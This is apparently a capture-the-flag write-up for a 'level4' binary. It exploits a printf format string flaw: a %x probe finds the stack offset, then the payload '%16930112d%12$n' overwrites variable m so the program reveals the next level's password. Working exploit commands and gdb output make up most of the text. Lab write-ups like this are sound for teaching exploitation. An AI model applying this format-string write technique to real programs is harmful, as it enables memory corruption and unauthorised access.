It's a format string attack again. We have to overflow over a printf called in an annexe function `p()` to change the value of `m` to access a system call that will print our flag.

```
   0x08048488 <+49>:	call   0x8048444 <p>
   0x0804848d <+54>:	mov    eax,ds:0x8049810
   0x08048492 <+59>:	cmp    eax,0x1025544
```

We need to set the value of `m` at the address `0x8049810` to `0x1025544`. 

Let's print a bunch of characters and a bunch of addresses thanks to the `%x` specifier (hexadecimal values) that causes the stack pointer to move towards the format string as `printf` considers them as arguments.

```
(gdb) r <<< $(python -c "print 'A' * 20 + '%x ' * 20")
Starting program: /home/user/level4/level4 <<< $(python -c'print "A" * 20 + "%x " * 20')
AAAAAAAAAAAAAAAAAAAAb7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 200 b7fd1ac0 b7ff37d0 41414141 41414141 41414141 41414141 41414141 25207825 78252078 20782520 25207825
```

It overflows at offset 12 and we can reach that value by writing `%12\$x` after the format string. Now, we want to write our target address `m => 0x8049810` at this place.

```
(gdb) r <<< $(python -c "print '\x10\x98\x04\x08' + '%12\$x'")
Starting program: /home/user/level4/level4 <<< $(python -c "print '\x10\x98\x04\x08' + '%12\$x'")
8049810
```

And like in level3, we have to give it the value `0x1025544 = 16930116`. `16930112` because of mention of the redirection address before.

```
(gdb) r <<< $(python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"')
...
 -1208015184
/bin/cat: /home/user/level5/.pass: Permission denied
```

in a terminal :
$ python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' | ./level4

It takes some times but it works...